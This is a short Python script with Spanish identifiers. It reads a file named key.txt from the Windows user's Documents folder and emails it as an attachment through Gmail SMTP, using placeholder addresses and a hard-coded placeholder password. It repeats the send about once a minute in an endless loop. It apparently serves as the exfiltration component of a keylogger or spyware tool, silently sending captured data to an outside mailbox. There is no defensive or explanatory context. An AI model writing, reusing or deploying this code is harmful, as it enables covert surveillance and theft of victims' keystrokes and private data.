from email import mime
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import smtplib
from email.mime import image
from email.mime import text
from email import encoders
import datetime
import os
u_s = os.environ['USERPROFILE']
usuario = u_s.replace("\\", "/")
class mailer:
    def enviar_email():
        if(os.path.exists(usuario+'/Documents/key.txt')):
            msg = MIMEMultipart()
            msg['From']="origen@gmail.com"
            msg['To']="destinatario@gmail.com"
            msg['Subject']='Info'
            f=open(usuario+'/Documents/key.txt','rb')
            adjunto_mime = MIMEBase('application','octet-stream')
            adjunto_mime.set_payload(f.read())
            encoders.encode_base64(adjunto_mime)
            adjunto_mime.add_header("Content-Disposition","attachment;filename="+usuario+"/Documents/key.txt")
            msg.attach(adjunto_mime)
            sesion_smtplib = smtplib.SMTP('smtp.gmail.com',587)
            sesion_smtplib.starttls()
            sesion_smtplib.login("origen@gmail.com","contraseña")
            texto = msg.as_string()
            sesion_smtplib.sendmail(msg['From'],msg['To'],texto)
            sesion_smtplib.quit()
        else:
            pass
x = mailer
x.enviar_email()
while 1:
    d = datetime.datetime.now().strftime('%S')
    if(d=="59"):
        x.enviar_email()
        print("email enviado")
    else:
        pass
